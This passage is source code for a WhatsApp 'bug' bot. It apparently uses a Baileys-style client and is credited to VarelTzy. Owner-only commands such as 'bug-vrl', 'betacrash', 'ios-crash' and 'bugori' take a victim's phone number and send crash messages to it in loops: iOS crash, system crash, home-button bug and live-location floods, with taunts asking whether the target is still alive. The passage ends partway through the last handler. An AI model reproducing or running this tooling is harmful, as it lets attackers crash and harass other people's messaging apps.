await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'bug-vrl': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let asww = q.replace(/[^0-9]/g, "")
if (asww.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = asww + '@s.whatsapp.net'
let buttoncyc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${asww}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${asww}`,
      merchant_url: `https://wa.me/${asww}`
   })
}], m, {
   body: buttoncyc,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 3; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, bugquoteddvc)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, bugquoteddvc)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, bugquoteddvc)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await pirgam(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await iponcrash(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'betacrash': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
replyy(ppk + " detik");
replyy(`TUNGGU BANG`)
for (let j = 0; j < jumlah; j++) {
await VxoZap.sendMessage(target, {text: `HALLO BANG`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await sendExtendedTextMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendExtendedTextMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendExtendedTextMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendExtendedTextMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendExtendedTextMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'betaonly': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
replyy(ppk + " detik");
replyy(`TUNGGU BANG`)
for (let j = 0; j < jumlah; j++) {
await VxoZap.sendMessage(target, {text: `HALLO BANG`}, {quoted:m})
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await ngeloc(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
await sendLiveLocationMessage(target, vareltzyhuraa)
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'lokasnew': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let aswww = q.replace(/[^0-9]/g, "")
if (aswww.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = aswww + '@s.whatsapp.net'
let buttoncycc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${aswww}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${aswww}`,
      merchant_url: `https://wa.me/${aswww}`
   })
}], m, {
   body: buttoncycc,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 3; j++) {
await VxoZap.sendMessage(Pe, {text: `HALLO BANG`}, {quoted:m})
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
}
await replyy(`CEK AJA PASTI C1`)
}
break

case 'ios-crash': case 'ipmodar': {

if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
replyy(ppk + " detik");
replyy(`TUNGGU BANG`)
for (let j = 0; j < jumlah; j++) {
await iponcrash(target)
await sendBugIos(target)
await bakdok(target, vareltzyhuraa)
await iponcrash(target)
await sendBugIos(target)
await iponcrash(target, vareltzybug)
await bughomebutton(target, vareltzyhuraa)
await bakdok(target, vareltzyhuraa)
await sendSystemCrashMessage(target, vareltzybugnew)
await sendSystemCrashMessage(target, vareltzyhuraa)
await sendViewOnceMessages(target, vareltzyhuraa)
await penghitaman(target, vareltzyhuraa)
await sendBugIos(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'gasdeh': case 'sokasik': case 'modesad': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let Pe = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
replyy(ppk + " detik");
replyy(`TUNGGU BANG`)
for (let j = 0; j < jumlah; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break

case 'bugori': case 'bugbisnis': case 'bugmods': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let anjul = q.replace(/[^0-9]/g, "")
if (anjul.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = anjul + '@s.whatsapp.net'
let buttonccc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${anjul}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${anjul}`,
      merchant_url: `https://wa.me/${anjul}`
   })
}], m, {
   body: buttonccc,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 1; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, {text: '𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: '𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄'}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'bugcek': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let rapper = q.replace(/[^0-9]/g, "")
if (rapper.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = rapper + '@s.whatsapp.net'
let buttoncccv = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${rapper}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${rapper}`,
      merchant_url: `https://wa.me/${rapper}`
   })
}], m, {
   body: buttoncccv,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 5; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
